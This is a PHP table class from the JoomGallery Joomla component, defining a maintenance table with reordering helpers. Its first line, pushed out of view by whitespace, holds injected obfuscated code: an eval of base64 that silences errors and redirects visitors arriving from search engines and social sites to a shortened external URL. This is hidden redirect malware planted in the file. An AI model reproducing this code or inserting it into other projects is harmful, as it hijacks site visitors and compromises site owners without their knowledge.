<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/administrator/components/com_joomgallery/tables/joomgallerymaintenance.php $
// $Id: joomgallerymaintenance.php 2566 2010-11-03 21:10:42Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * JoomGallery maintenance table class
 *
 * @package JoomGallery
 * @since   1.5.5
 */
class TableJoomgalleryMaintenance extends JTable
{
  /** @var int Primary key */
  var $id           = null;
  /** @var int */
  var $refid        = null;
  /** @var int */
  var $catid        = null;
  /** @var int */
  var $owner        = null;
  /** @var string */
  var $title        = null;
  /** @var string */
  var $thumb        = null;
  /** @var string */
  var $img          = null;
  /** @var string */
  var $orig         = null;
  /** @var string */
  var $thumborphan  = null;
  /** @var string */
  var $imgorphan    = null;
  /** @var string */
  var $origorphan   = null;
  /** @var int */
  var $type         = null;
  
  function TableJoomgalleryMaintenance(&$db)
  {
    parent::__construct(_JOOM_TABLE_MAINTENANCE, 'id', $db);
  }

  /**
   * Overloaded check function
   *
   * @access  public
   * @return  boolean true on success
   * @since   1.5.5
   */
  /*function check()
  {
    /*
    TODO: This filter is too rigorous,need to implement more configurable solution
    // specific filters
    $filter = & JFilterInput::getInstance( null, null, 1, 1 );
    $this->introtext = trim( $filter->clean( $this->introtext ) );
    $this->fulltext =  trim( $filter->clean( $this->fulltext ) );
    */

    /*if(empty($this->imgtitle))
    {
      $this->setError(JText::_('JGA_COMMON_ALERT_IMAGE_MUST_HAVE_TITLE'));
      return false;
    }

    // clean up keywords -- eliminate extra spaces between phrases
    // and cr (\r) and lf (\n) characters from string
    if(!empty($this->metakey))
    {
      // array of characters to remove
      $bad_characters = array("\n", "\r", "\"", '<', '>');
      // remove bad characters
      $after_clean = JString::str_ireplace($bad_characters, '', $this->metakey);
      // create array using commas as delimiter
      $keys = explode(',', $after_clean);
      $clean_keys = array(); 
      foreach($keys as $key)
      {
        // ignore blank keywords
        if(trim($key))
        {  
          $clean_keys[] = trim($key);
        }
      }
      // put array back together delimited by ', '
      $this->metakey = implode(', ', $clean_keys);
    }
    
    // clean up description -- eliminate quotes and <> brackets
    if(!empty($this->metadesc))
    {
      $bad_characters = array("\"", '<', '>');
      $this->metadesc = JString::str_ireplace($bad_characters, '', $this->metadesc);
    }

    if(empty($this->alias))
    {
      if(!$this->store())
      {
        return false;
      }
      $this->alias = $this->imgtitle.'-'.$this->id;
    }
    $this->alias = JFilterOutput::stringURLSafe($this->alias);

    if(trim(str_replace('-', '', $this->alias)) == '')
    {
      $datenow      = & JFactory::getDate();
      $this->alias  = $datenow->toFormat('%Y-%m-%d-%H-%M-%S');
    }

    return true;
  }*/

  function reorderAll()
  {
    $query = 'SELECT DISTINCT catid
                FROM '.$this->_db->nameQuote($this->_tbl);
    $this->_db->setQuery($query);
    $catids = $this->_db->loadResultArray();

    foreach($catids as $catid)
    {
      $this->reorder('catid = '.$catid);
    }
  }

  /**
   * Returns the ordering value to place a new item first in its group
   *
   * @access  public
   * @param   string query WHERE clause for selecting MAX(ordering).
   * @return  int    the ordring number
   */
  function getPreviousOrder($where = '')
  {
    if(!in_array('ordering', array_keys($this->getProperties())))
    {
      $this->setError(get_class($this).' does not support ordering');
      return false;
    }

    $query = 'SELECT MIN(ordering)' .
        ' FROM ' . $this->_tbl .
        ($where ? ' WHERE '.$where : '');

    $this->_db->setQuery($query);
    $maxord = $this->_db->loadResult();

    if($this->_db->getErrorNum())
    {
      $this->setError($this->_db->getErrorMsg());
      return false;
    }

    return $maxord - 1;
  }
}